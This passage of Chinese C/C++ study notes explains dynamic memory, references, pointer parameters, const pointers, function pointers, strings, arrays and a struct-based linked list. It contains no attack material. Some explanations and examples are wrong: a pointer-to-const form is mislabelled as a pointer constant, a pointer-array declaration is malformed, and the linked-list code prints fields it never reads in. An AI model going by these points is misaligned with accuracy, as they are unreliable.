<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *pn=(<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br></pre></td></tr></table></figure>
<p>​
该语句按照int类型数据存储空间的大小分配了4个字节的空间，并由整型指针pn指向该内存空间。</p>
<p>​ 函数free的原型为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">(<span class="type">void</span> *ptr)</span></span></span><br></pre></td></tr></table></figure>
<p>​ 所要释放的内存由ptr指向</p>
<h3 id="c的动态内存申请和释放">C++的动态内存申请和释放</h3>
<p>​ 动态内存申请运算符new的使用格式：<strong>new
<类型名>(初值)</strong></p>
<p>​
运算成功<strong>返回指定类型内存的地址</strong>，申请失败返回NULL指针。</p>
<p>​ 一般总是将动态申请的地址赋值给一个指针。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *pi=<span class="number">0</span>;</span><br><span class="line">pi=<span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<p>​ 如果申请成功，指针pi就获得了一个有效的地址，并使得*pi=10。</p>
<p>​
动态内存使用完毕后，需要用delete运算符来释放，delete的使用格式：<strong>delete
<指针名></strong></p>
<p>​
动态内存的申请和释放应该配合使用，<strong>new和delete应该成对出现</strong>。</p>
<p>​ 申请动态一维数组时，要在new表达式中加上申请数组的大小</p>
<p>​ 格式：<strong>new <类型名>[表达式]</strong></p>
<p>​ 在动态申请数组时，<strong>不可以对数组进行初始化</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *piarray=<span class="number">0</span>;</span><br><span class="line">piarray=<span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>
<p>​ 这样申请得到的地址的类型仍然是(int
*)，只是申请了10个这样的整型数据空间</p>
<p>​ 释放动态数组空间要用：<strong>delete []<指针名>;</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p1=<span class="keyword">new</span> <span class="type">int</span>;</span><br><span class="line"><span class="type">int</span> *p2=<span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">delete</span> p1;</span><br><span class="line"><span class="keyword">delete</span>[] p2;</span><br></pre></td></tr></table></figure>
<h2 id="引用">引用</h2>
<p>​
引用是<strong>变量或者其他编程实体（如对象）的别名</strong>，因此，<strong>引用是不可以单独定义的</strong>。</p>
<p>​
变量A在内存中有自己的地址，而A的引用B实际上就是变量A，只是A的另外一个名字。<strong><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208155056171.png" /></strong></p>
<p>​
指针变量本身也有自己的地址，是可以独立存在的，而引用是不可以独立存在的。</p>
<h3 id="引用的声明">引用的声明</h3>
<p>​
引用是通过<strong>运算符&amp;</strong>来定义的，定义格式：<类型名>&amp;引用名=变量名；</p>
<p>​ 其中，变量名是要已经定义的，并且与引用的类型相同</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> someInt;</span><br><span class="line"><span class="type">int</span> &amp;refInt=someInt;</span><br></pre></td></tr></table></figure>
<p>​
refInt就是变量someInt的引用，引用refInt和someInt具有相同的地址，对引用refInt的操作也就是对变量someInt的操作。</p>
<p>​
引用必须在声明的同时完成初始化，不可以先声明引用，再用另一个语句对它进行初始化。</p>
<p>​ 下面是错误的例子：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> someInt;</span><br><span class="line"><span class="type">int</span> &amp;refInt;</span><br><span class="line">refInt=someInt;</span><br></pre></td></tr></table></figure>
<p>​ 引用具有以下特定：</p>
<ul>
<li>引用<strong>不能独立存在</strong>，它只是其他变量的别名；</li>
<li>引用必须在声明的<strong>同时初始化</strong>；</li>
<li>引用一旦定义，引用关系就<strong>不可以更改</strong>；</li>
<li>引用的类型就是相关变量的类型，引用的使用和变量的使用相同；</li>
</ul>
<h3 id="引用的使用">引用的使用</h3>
<p>​ 通过引用使用/修改相关的变量。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> intA=<span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> &amp;refA=intA;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;引用的值和相关变量值相同:refA=&quot;</span>&lt;&lt;refA&lt;&lt;endl;</span><br><span class="line">	refA=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;引用变化，则相关变量也变化:intA=&quot;</span>&lt;&lt;intA&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
在程序中真正使用引用的地方是在函数调用中：或者将引用作为函数的<strong>形式参数</strong>，或者将引用作为函数的<strong>返回值</strong>。</p>
<h2 id="指针与函数">指针与函数</h2>
<h3 id="指针作为函数参数">指针作为函数参数</h3>
<p>​ 指针和函数可以实现<strong>地址调用</strong>。</p>
<p>​ 必须满足以下条件：</p>
<ul>
<li>函数的<strong>形式参数</strong>是<strong>指针变量</strong>；</li>
<li>函数的<strong>实际参数</strong>是<strong>内存的地址</strong>，具体来说可以是数组名、变量的地址、用变量地址初始化的指针；</li>
<li>形参指针类型和实参地址<strong>类型</strong>必须相同</li>
</ul>
<p>​ 满足以上条件后，这样的函数调用在使用上具有以下特点：</p>
<ul>
<li>实参传递给形参的是内存的地址，所以<strong>形参指针指向实参变量</strong>；</li>
<li>形参指针通过<strong>间接引用直接访问实参变量</strong>，包括改变实参变量的值；</li>
<li>函数调用后，可以保留对实参变量的操作结果，如果有多个实参，就可以有多个实参变量在函数调用中得到修改</li>
</ul>
<p>​
这种调用方式可以实现“参数的双向传递”，即实参将变量地址传递给形参指针，，形参将变量变化的结果传递给变量；也可以称为“可以返回多个结果”。</p>
<p>​
实际上并不存在形参到实参的“返回”操作，形参指针的间接引用就是对实参变量的操作，实参变量的变化在函数调用的过程以及发生，而不是在函数执行后才发生。</p>
<p>​
数组作为函数参数就属于这种情况，现在是用指针代替数组名，属于更一般的情况。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Swap</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> *b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">(<span class="number">10</span>)</span>,<span class="title">y</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;主函数变量的值：x=&quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">Swap</span>(&amp;x,&amp;y);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;返回后变量的值：x=&quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;y=&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Swap</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> t;</span><br><span class="line">	t=*a;</span><br><span class="line">	*a=*b;</span><br><span class="line">	*b=t;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;函数中完成了交换：*a=&quot;</span>&lt;&lt;*a&lt;&lt;<span class="string">&quot;    *b=&quot;</span>&lt;&lt;*b&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208163428475.png" /></p>
<p>​ 如果要函数返回一个结果，直接用函数的返回值；</p>
<p>​ 如果要从函数中得到多个结果，就要使用指针作为形参的地址调用</p>
<h3 id="引用作为函数参数">引用作为函数参数</h3>
<p>​ 引用的主要应用就是作为函数的形式参数</p>
<p>​ 引用作为函数的形参有如下特点：</p>
<ul>
<li>实际参数是相同类型的变量</li>
<li>参数传递属于<strong>地址传递</strong></li>
<li>在函数中并不产生实际参数的副本，形式参数的引用和实际参数的变量实际上是同一个实体</li>
<li>函数对引用的操作，也是对实参变量的操作，函数调用可以改变实际参数的值</li>
</ul>
<p>例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap_1</span><span class="params">(<span class="type">int</span> &amp;x,<span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    j=x;</span><br><span class="line">    x=y;</span><br><span class="line">    y=j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">12345</span>,b=<span class="number">54321</span>;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;函数调用前：a=&quot;</span>&lt;&lt;a&lt;&lt;<span class="string">&quot;  b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="built_in">swap_1</span>(a,b);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;函数调用后：a=&quot;</span>&lt;&lt;a&lt;&lt;<span class="string">&quot;  b=&quot;</span>&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​ 与指针作为形式参数的相似点：</p>
<ul>
<li>两者都属于<strong>地址调用</strong>：通过指针的地址调用和通过引用的地址调用；</li>
<li>两者在函数调用时都不建立实参的副本，而是对实参的数据直接进行操作；</li>
<li>指针作为形式参数需要在函数中定义指针变量，引用作为形式参数不需要新建任何实体，所以引用不需要占用新的内存，执行效率更高；</li>
<li>用引用作为形式参数，编程语句也会更简单</li>
</ul>
<p>​ 所以在C++中，常常使用引用作为函数的形式参数</p>
<h3 id="常指针和指针常量不考">常指针和指针常量（不考）</h3>
<p>​
可以使用<strong>常指针</strong>和<strong>常引用</strong>实现对传递参数的保护。</p>
<p>​
常指针是<strong>指向常量的指针</strong>的习惯说法，就是规定指针所指向的内容不可以通过指针的间接引用改变。</p>
<p>​ 常指针的定义格式：</p>
<p>​ <code>const &lt;类型名&gt; *&lt;指针名&gt;;</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> *ptint;</span><br></pre></td></tr></table></figure>
<p>​
其中，指针ptint的类型是<code>(const int*)</code>，也就是指向一个恒定的整型数。但是这个整型数本身也许是可以改变的，只是不可以通过指针ptint的间接引用来改变。。而ptint也可以用不同的地址对它进行赋值。</p>
<p>​ 常指针最常见的应用是在函数原型中，如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *<span class="title">strcpy</span><span class="params">(<span class="type">char</span> *s1,<span class="type">const</span> <span class="type">char</span> *s2)</span></span>;</span><br></pre></td></tr></table></figure>
<p>​
其中，字符串复制函数中有两个参数，都是字符指针，功能是把s2指向的字符复制给s1，s2指向的字符串不要被函数修改，所以定义常指针。</p>
<p>​ 类似地，也可以定义常引用，格式为：<strong>const <类型名>
<引用名>&amp;;</strong></p>
<p>​
还有另外一种和常量有关的指针：指针常量，也就是指针本身的内容是常量，不可以改变，声明格式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;类型名&gt; *<span class="type">const</span> &lt;指针名&gt;=&lt;初值&gt;;</span><br></pre></td></tr></table></figure>
<p>​ 也可以写成：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;类型名&gt; <span class="type">const</span> *&lt;指针名&gt;=&lt;初值&gt;;</span><br></pre></td></tr></table></figure>
<p>​ 例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> ch,*<span class="type">const</span> ptch=&amp;ch;</span><br></pre></td></tr></table></figure>
<p>​
这是，指针ptch是用ch地址初始化的常量，不可以改为其他地址，但可以通过ptch的间接引用来改变ch的值。</p>
<p>​ 数组名就是一个指针常量。</p>
<p>​
常指针可以改变指针<strong>指向的地址</strong>，但不可以改变指针指向的<strong>地址的内容</strong>；</p>
<p>​
指针常量可以改变指针<strong>指向的地址内容</strong>，但不可以改变指针<strong>指向的地址</strong>；</p>
<h3 id="指针函数和函数指针不考">指针函数和函数指针（不考）</h3>
<p>​ 指针函数：函数的返回值是指针，例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> *<span class="title">func01</span><span class="params">(<span class="type">int</span> k)</span></span>;</span><br></pre></td></tr></table></figure>
<p>​ 返回指针，实际上就是返回一个内存单元的地址。.</p>
<p>例子：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> *<span class="title">reverse</span><span class="params">(<span class="type">int</span> <span class="type">const</span> *list, <span class="type">const</span> <span class="type">int</span> size)</span> <span class="comment">// 指针函数，形参有指针常量</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> *result = <span class="keyword">new</span> <span class="type">int</span>[size];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = size - <span class="number">1</span>; i &lt; size; i++, j--)</span><br><span class="line">	&#123;</span><br><span class="line">		result[j] = list[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printArray</span><span class="params">(<span class="type">int</span> <span class="type">const</span> *list, <span class="type">const</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; list[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> list[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line">	<span class="type">int</span> *pList = <span class="built_in">reverse</span>(list, <span class="number">6</span>);</span><br><span class="line">	<span class="built_in">printArray</span>(pList, <span class="number">6</span>);</span><br><span class="line">	<span class="keyword">delete</span>[] pList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
不能返回函数中局部变量的地址，这样的地址处于内存的栈区，函数结束时所占用的栈空间就释放了，回到主调函数后不能再使用该空间了。所以上面的例子中，不能在reverse函数中定义局部数组int
result[6]，使用堆空间是比较好的解决办法。</p>
<p>​ 指针和函数有着天然的联系，函数名本身就是地址。</p>
<p>​
指针不仅可以指向变量，还可以指向函数，<strong>指向函数的指针</strong>被称为<strong>函数指针</strong>，定义的语法格式为：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;类型名&gt;(*指针名)(形参列表):</span><br></pre></td></tr></table></figure>
<p>​
其中，数据类型代表函数的返回值类型，形参列表是所指函数的形参列表，例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(*fptr)(<span class="type">int</span>,<span class="type">int</span>);</span><br></pre></td></tr></table></figure>
<p>​
函数指针指向某个函数后，就可以像使用函数名一样使用函数指针来调用函数了。</p>
<p>​
因为函数名代表函数的内存地址，所以给函数指针赋值的时候，直接用函数名即可，不需要取地址运算符<strong>&amp;</strong>。</p>
<h3 id="指针与字符串">指针与字符串</h3>
<p>​
C++字符串常量是用双引号括起的字符序列，并以字符'\0'作为结束标志。</p>
<p>​
字符常量存放在内存的常量区域，有自己固定的首地址。如果将字符串常量的首地址看作指针，这种指针既是常指针，也是指针常量。即<strong>字符串的内容和首地址都是不能改变的。</strong></p>
<h4 id="处理字符串的两种方式">处理字符串的两种方式</h4>
<p>​ <strong>数组方式和指针方式</strong></p>
<p>​
数组方式是将字符串存入字符数组后，再进行处理，一般可以声明数组时用字符串来进行初始化。</p>
<p>​
指针方式是用<strong>字符串常量</strong>来初始化一个字符指针，例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *string_pt=<span class="string">&quot;Hello World&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>​ 两种操作方式的区别：</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208175347976.png" /></p>
<p>​
数组名是<strong>指针常量</strong>，是<strong>右值</strong>，不能放在等号左边。</p>
<h4 id="字符串操作函数">字符串操作函数</h4>
<p>​
C++提供了大量字符串处理函数，需要包含头文件<strong>&lt;cstring&gt;</strong>。</p>
<p>​</p>
<table>
<colgroup>
<col style="width: 10%" />
<col style="width: 38%" />
<col style="width: 26%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">功能</th>
<th style="text-align: center;">函数原型</th>
<th style="text-align: center;">返回值</th>
<th style="text-align: center;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">字符串长度</td>
<td style="text-align: center;">int strlen(const char *string);</td>
<td style="text-align: center;">长度值</td>
<td style="text-align: center;">'\0'不计入</td>
</tr>
<tr class="even">
<td style="text-align: center;">字符串复制</td>
<td style="text-align: center;">char <em>strcpy(char </em>s1,const char
*s2);</td>
<td style="text-align: center;">复制的字符串</td>
<td style="text-align: center;">s1要有足够的空间</td>
</tr>
<tr class="odd">
<td style="text-align: center;">按字符数复制</td>
<td style="text-align: center;">char <em>strncpy(char </em>s1,const char
*s2,int n)</td>
<td style="text-align: center;">复制的字符串</td>
<td style="text-align: center;">s1要有足够的空间</td>
</tr>
<tr class="even">
<td style="text-align: center;">字符串比较</td>
<td style="text-align: center;">int strcmp(const char <em>s1,const char
</em>s2);</td>
<td style="text-align: center;">&lt;0,=0,&gt;0
对应s1&lt;s2,s1=s2,s1&gt;s2</td>
<td style="text-align: center;">按字符顺序比较ACSII码值的大小</td>
</tr>
<tr class="odd">
<td style="text-align: center;">字符串连接</td>
<td style="text-align: center;">char <em>strcat(char </em>s1,const char
*s2);</td>
<td style="text-align: center;">连接后的字符串</td>
<td style="text-align: center;">s1要有足够的空间</td>
</tr>
</tbody>
</table>
<p>​
多数函数是以字符指作为形式参数，源字符串都是常指针，以保护原来的数据。</p>
<h2 id="指针与数组">指针与数组</h2>
<p>​ 数组名本身就是地址</p>
<h3 id="通过指针访问一维数组">通过指针访问一维数组</h3>
<p>​ 一维数组名就是数组的地址，一维数组名可以看做指针，具有以下特点：</p>
<ul>
<li><p>指针的类型是指向数组元素的指针，因此，数组名也是数组第一个元素的地址，对于数组A来说，数组名A和&amp;A[0]具有相同的类型和相同的值；</p></li>
<li><p>通过数组名的间接引用运算，如*A，就可以访问数组的第一个元素A[0]；</p></li>
<li><p>数组名所包含的地址值是不可改变的，是指针常量；</p>
<p>要通过指针访问一维数组，必须先声明一个和数组类型相同的指针，并且用数组名来对指针进行初始化，例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> A[<span class="number">10</span>],*pa=A;</span><br></pre></td></tr></table></figure>
<p>然后就可以通过数组名或所定义的指针变量，用以下多种方式访问数组元素</p></li>
<li><p>数组名和下标</p></li>
<li><p>指针和下标，如pa[0],pa[4]</p></li>
<li><p>指针加偏移量的间接引用</p></li>
<li><p>数组名加偏移量的间接引用</p></li>
<li><p>指针自加后的间接引用，如*pa++，但这种方式会改变指着本身的值</p></li>
</ul>
<p>​
但是，不允许数组名自加后的间接引用来访问数组元素，如*A++，因为数组名是常量</p>
<h3 id="指针数组">指针数组</h3>
<p>​ 若数组元素是某种类型的指针，称这样的数组为指针数组。</p>
<p>​ 指针数组的声明格式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;类型&gt; *&lt;数组名&gt;\[常量表达式]</span><br></pre></td></tr></table></figure>
<p>​ 例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">char</span> (member_name[<span class="number">10</span>]);</span><br></pre></td></tr></table></figure>
<p>​ 使用较多的是指向字符的指针：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> *member_name[] = &#123;<span class="string">&quot;Merry&quot;</span>, <span class="string">&quot;John&quot;</span>, <span class="string">&quot;Hill&quot;</span>&#125;;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The namelist show as:\n&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; member_name[i] &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3
id="指针数组作为main函数的形参不考">指针数组作为main函数的形参（不考）</h3>
<p>​ 命令行参数是main函数的参数。带有命令行参数的main函数的原型是：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;类型&gt;<span class="built_in">main</span>(<span class="type">int</span> argc,<span class="type">char</span> *argv\[]);</span><br></pre></td></tr></table></figure>
<p>​ 可见，有两个命令行参数</p>
<p>​
argc：整数，存放命令行参数的数目，这个参数不需要用户输入，由程序自动统计，所统计的命令行参数包括所执行的程序名。</p>
<p>​
argv[]：指针数组，存放所输入的命令行参数。命令行参数都看做是字符串，用空格隔开，回车结束。指针数组中存放各个字符串的地址。其中argv[0]是所执行的程序名，argv[argc-1]是最后一个输入的参数字符串，argv[argc]中自动存入NULL，表示输入结束。</p>
<h3 id="二维数组与指针">二维数组与指针</h3>
<p>​
二维数组可以看成是一维数组的一维数组。二维数组名虽然也是地址，但是却与一维数组有不同的类型。</p>
<p>​
对于一维数组A[5]，数组名A的地址就是<strong>数组第一个元素A[0]的地址</strong>。指针的类型是<strong>指向数组元素的指针</strong>，A+1就是元素A[1]的地址。</p>
<p>​
对于二维数组B[3][4],数组名B的地址，则是其中第一个一维数组B[0]的地址。指针的类型是<strong>指向一维数组的指针</strong>。B+1就是下一个一维数组B[1]的地址。</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230208183728480.png" /></p>
<p>​
数组名B和C虽然都是指向一维数组的指针，两者还是有差别：所指向的一维数组的大小不同。</p>
<p>​ 因此在定义指向一维数组的指针时，还必须指出一维数组的大小。</p>
<p>​ 指向一维数组的指针的格式：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&lt;类型名&gt;(*指针变量名)[一维数组大小];</span><br></pre></td></tr></table></figure>
<p>​ 例如，和上图中两个二维数组所对应的指向一维数组的指针定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">char</span> (*ptchb)[<span class="number">4</span>],(ptchc)[<span class="number">2</span>];</span><br><span class="line">ptchb=B;</span><br><span class="line">ptchc=C;</span><br></pre></td></tr></table></figure>
<p>​
这样定义后，ptchb就是指向一维数组B[0]的指针，ptchb+1就是指向一维数组B[1]的指针。</p>
<p>​ 对于指向一维数组的指针，具有以下特征：</p>
<ul>
<li>二维数组名是<strong>指向一维数组的指针</strong>，而不是指向<strong>数组元素的指针</strong>；</li>
<li>指向一维数组指针加1的结果，是指向<strong>下一个一维数组</strong>的指针。若ptchb指向一维数组B[0]，ptchb+1就是指向一维数组B[1]；</li>
<li>指向一维数组的指针的间接引用的结果<strong>仍然是地址</strong>（ptchb指向的内存单元内仍然是地址），即<strong>*ptchb仍然是地址</strong>，只是地址的类型变了，变为一维数组B[0]第一个元素B[0][0]的地址。*ptchb+1是B[0][0]下一个元素的地址，即B[0][1]的地址；</li>
</ul>
<p>​
因为*ptchb是数组元素的地址，**ptchb就是数组元素的值。用指向一维数组指针访问数组元素的一般公式是：<strong>*(*(指针名+i)+j)</strong>是<strong>第i行第j列</strong>元素的地址：(指针名+i)是二维数组第i行的地址，*(指针名+i)是第i行第0列元素的地址，(*(指针名+i)+j)是第i行第j列元素的地址</p>
<p>​ 借助于指向一维数组指针的概念，可以用单循环访问二维数组。</p>
<h2 id="指针与结构体">指针与结构体</h2>
<p>​ 可以定义指向结构型数据类型的指针变量。</p>
<p>​ 声明了指向结构的指针后，必须对指针进行初始化。</p>
<ul>
<li><p>可以将结构变量的地址赋给结构指针，使用取地址符&amp;操作，得到结构变量的地址，这个地址是结构的第一个成员的地址</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">	<span class="type">long</span> num;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="type">float</span> score;</span><br><span class="line">&#125;;</span><br><span class="line">student stu=&#123;<span class="number">20041118</span>,<span class="string">&quot;Li Li&quot;</span>,<span class="number">81</span>&#125;</span><br><span class="line">student *ps=&amp;stu</span><br></pre></td></tr></table></figure></li>
<li><p>使用new操作在堆中给结构指针分配空间</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">student *ps=<span class="keyword">new</span> student;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>​
用结构指针访问结构成员时，<strong>用箭头操作符代替原来的点操作符</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cout&lt;&lt;ps-&gt;score;</span><br></pre></td></tr></table></figure>
<p>​ <strong>ps-&gt;score等价于(*ps).score</strong>。</p>
<p>​
结构体指针数组，每个元素是结构体变量的地址，用交换指针代替交换结构体变量。</p>
<p>​
链表是通过指针链接在一起的一组数据项，是一种非常有用的<strong>动态数据结构</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个链表</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> num;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">	<span class="type">float</span> score;</span><br><span class="line">	student *next; <span class="comment">// 指向下一个学生的指针</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	student *head = <span class="literal">NULL</span>, *temp = <span class="literal">NULL</span>;</span><br><span class="line">	head = <span class="keyword">new</span> student;</span><br><span class="line">	temp = head;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		temp-&gt;num = i;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Please input name and score for No.&quot;</span> &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">		temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		i++;</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">5</span>)</span><br><span class="line">			<span class="keyword">break</span>;<span class="comment">//建立4个节点的链表</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			temp-&gt;next = <span class="keyword">new</span> student;</span><br><span class="line">			temp = temp-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	temp = head;</span><br><span class="line">	<span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; temp-&gt;num &lt;&lt; <span class="string">&quot;  &quot;</span> &lt;&lt; temp-&gt;name &lt;&lt; <span class="string">&quot;  &quot;</span> &lt;&lt; temp-&gt;score &lt;&lt; endl;</span><br><span class="line">		temp = temp-&gt;next;</span><br><span class="line">	